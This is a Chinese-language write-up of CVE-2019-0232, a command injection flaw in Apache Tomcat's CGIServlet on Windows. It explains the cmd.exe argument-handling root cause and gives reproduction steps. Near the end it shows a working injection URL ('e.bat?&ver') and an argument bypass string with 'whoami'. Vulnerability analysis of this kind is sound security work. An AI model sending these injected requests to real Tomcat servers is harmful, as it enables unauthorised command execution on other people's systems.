# （CVE-2019-0232）Tomcat rce

> 原文：[http://book.iwonder.run/0day/Tomcat/CVE-2019-0232.html](http://book.iwonder.run/0day/Tomcat/CVE-2019-0232.html)

## 一、漏洞简介

该漏洞是由于 Tomcat CGI 将命令行参数传递给 Windows 程序的方式存在错误，使得 CGIServlet 被命令注入影响。

该漏洞只影响 Windows 平台，要求启用了 CGIServlet 和 enableCmdLineArguments 参数。但是 CGIServlet 和 enableCmdLineArguments 参数默认情况下都不启用。

## 二、漏洞影响

Apache Tomcat 9.0.0.M1 to 9.0.17

Apache Tomcat 8.5.0 to 8.5.39

Apache Tomcat 7.0.0 to 7.0.93

## 三、复现过程

### 漏洞分析

漏洞相关的代码在 `tomcat\java\org\apache\catalina\servlets\CGIServlet.java` 中，CGIServlet 提供了一个 cgi 的调用接口，在启用 `enableCmdLineArguments` 参数时，会根据 RFC 3875 来从 Url 参数中生成命令行参数，并把参数传递至 Java 的 `Runtime` 执行。 这个漏洞是因为 `Runtime.getRuntime().exec` 在 Windows 中和 Linux 中底层实现不同导致的。下面以一个简单的 case 来说明这个问题，在 Windows 下创建 arg.bat：

```
rem arg.bat
echo %* 
```

并执行如下的 Java 代码

```
String [] cmd={"arg.bat", "arg", "&", "dir"};
Runtime.getRuntime().exec(cmd); 
```

在 Windows 下会输出 `arg` 和 `dir` 命令运行后的结果。同样的，用类似的脚本在 Linux 环境下测试：

```
# arg.sh
for key in "$@"
do
    echo '$@' $key
done
String [] cmd={"arg.sh", "arg", "&", "dir"};
Runtime.getRuntime().exec(cmd); 
```

此时的输出为

```
$@ arg
$@ &
$@ dir 
```

导致这种输出的原因是在 JDK 的实现中 `Runtime.getRuntime().exec` 实际调用了 `ProcessBuilder` ，而后 `ProcessBuilder` 调用 `ProcessImpl`使用系统调用 `vfork` ，把所有参数直接传递至 `execve`。

用 `strace -F -e vfork,execve java Main` 跟踪可以看到上面的 Java 代码在 Linux 中调用为

```
execve("arg.sh", ["arg.sh", "arg", "&", "dir"], [/* 23 vars */]) 
```

而如果跟踪类似的 PHP 代码 `system('a.sh arg & dir');` ，得到的结果为

```
execve("/bin/sh",  ["sh", "-c", "a.sh arg & dir"], [/* 23 vars */]) 
```

所以 Java 的 `Runtime.getRuntime().exec` 在 CGI 调用这种情况下很难有命令注入。而 Windows 中创建进程使用的是 `CreateProcess` ，会将参数合并成字符串，作为 `lpComandLine` 传入 `CreateProcess` 。程序启动后调用 `GetCommandLine` 获取参数，并调用 `CommandLineToArgvW` 传至 argv。在 Windows 中，当 `CreateProcess` 中的参数为 bat 文件或是 cmd 文件时，会调用 `cmd.exe` , 故最后会变成 `cmd.exe /c "arg.bat & dir"`，而 Java 的调用过程并没有做任何的转义，所以在 Windows 下会存在漏洞。

除此之外，Windows 在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如 `dir "\"&whoami"` 在 Linux 中是安全的，而在 Windows 会执行命令。

这是因为 Windows 在处理命令行参数时，会将 `"` 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 `"` ，但是对 `\"` 的处理有误。同样用 `arg.bat` 做测试，可以发现这里只输出了 `\` 。因此在 Java 中调用批处理或者 cmd 文件时，需要做合适的参数检查才能避免漏洞出现。

### 漏洞复现

笔者使用的复现环境为 9.0.12 + JRE 1.8.0。

首先进行 CGI 相关的配置，在 `conf/web.xml` 中启用 CGIServlet：

```
<servlet>
    <servlet-name>cgi</servlet-name>
    <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>
    <init-param>
      <param-name>cgiPathPrefix</param-name>
      <param-value>WEB-INF/cgi-bin</param-value>
    </init-param>
    <init-param>
      <param-name>enableCmdLineArguments</param-name>
      <param-value>true</param-value>
    </init-param>
    <init-param>
      <param-name>executable</param-name>
      <param-value></param-value>
    </init-param>
    <load-on-startup>5</load-on-startup>
</servlet> 
```

这里主要的设置是 `enableCmdLineArguments` 和 `executable` 两个选项。 `enableCmdLineArguments` 启用后才会将 Url 中的参数传递到命令行， `executable` 指定了执行的二进制文件，默认是 `perl`，需要置为空才会执行文件本身。

同样在 `conf/web.xml` 中启用 cgi 的 servlet-mapping

```
<servlet-mapping>
    <servlet-name>cgi</servlet-name>
    <url-pattern>/cgi-bin/*</url-pattern>
</servlet-mapping> 
```

之后修改 `conf/context.xml` 的 `` 添加`privileged="true"`属性，否则会没有权限

```
<Context privileged="true">

    <!-- Default set of monitored resources. If one of these changes, the    -->
    <!-- web application will be reloaded.                                   -->
    <WatchedResource>WEB-INF/web.xml</WatchedResource>
    <WatchedResource>WEB-INF/tomcat-web.xml</WatchedResource>
    <WatchedResource>${catalina.base}/conf/web.xml</WatchedResource>

    <!-- Uncomment this to disable session persistence across Tomcat restarts -->
    <!--
    <Manager pathname="" />
    -->
</Context> 
```

然后在 `ROOT\WEB-INF` 下创建 `cgi-bin` 目录, 并在该目录下创建一个内容为 `echo Content-type: text/html` 的 `e.bat` 文件。

配置完成后，启动 tomcat，访问 `http://0-sec.org:8080/cgi-bin/e.bat?&ver` ，可以看到命令执行成功。

## 参考链接

> [https://xz.aliyun.com/t/4875](https://xz.aliyun.com/t/4875)

